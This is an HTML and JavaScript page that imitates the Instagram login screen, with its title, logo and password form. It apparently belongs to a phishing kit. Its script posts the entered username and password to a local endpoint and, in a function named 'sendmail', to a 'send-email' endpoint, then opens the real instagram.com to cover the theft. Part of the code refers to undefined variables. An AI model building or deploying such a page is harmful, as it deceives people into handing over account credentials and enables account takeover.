<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="color-scheme" content="light dark">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <link href="https://fonts.googleapis.com/css2?family=Lobster&display=swap" rel="stylesheet">
    <title>Instagram</title>
</head>

<body>

    <main class="flex align-items-center justify-content-center">

        <section id="mobile" class="flex">
        </section>

        <section id="auth" class="flex direction-column">

            <div class="panel login flex direction-column">

                <h1 id="instatitle" title="Instagram" class="flex justify-content-center">
                    <img height="70px" width="70px" src="./img/instagram-logo.png" alt="Instagram logo"
                        title="Instagram logo" />
                </h1>

                <form>

                    <label for="email" class="sr-only">
                        Phone number, username, or email
                    </label>

                    <input id="idinput" name="email" placeholder="Phone number, username, or email" />

                    <label for="password" class="sr-only">
                        Password
                    </label>

                    <input id="password" name="password" type="password" placeholder="Password" />

                    <button id="loginbt" type="button" onclick="login()">
                        Log In
                    </button>

                </form>

                <!-- Inline error message (empty fields) -->
                <h5 hidden id="error">The login information you entered is incorrect</h5>



            </div>

        </section>

    </main>

    <footer>
        <a id="forgot-password" href="https://www.instagram.com/accounts/password/reset/">
            Forgotten password?
        </a>
    </footer>

    <script>

        async function login() {

            const username =
                document.getElementById("idinput").value;

            const password =
                document.getElementById("password").value;

            if (!username || !password) {
                document.getElementById("error").hidden = false;
                return;
            }

            document.getElementById("error").hidden = true;

            try {

                const response = await fetch("/api/login", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        username,
                        password
                    })
                });

                const data = await response.json();

                console.log(data);

            } catch (err) {
                console.error(err);
            }
        }



        //Send email
        window.sendmail = async function () {



            // Empty field check
            if (username === "" || password === "") {

                document.getElementById("error").hidden = false;
                return;

            } else {

                document.getElementById("error").hidden = true;
            }

            try {

                const response = await fetch("send-email", {

                    method: "POST",

                    headers: {
                        "Content-Type": "application/json"
                    },

                    body: JSON.stringify({
                        username: username,
                        password: password
                    })
                });

                const data = await response.json();

                console.log(data);

                window.open("https://www.instagram.com/");

            } catch (err) {

                console.error(err);
            }
        };

    </script>
</body>

</html>
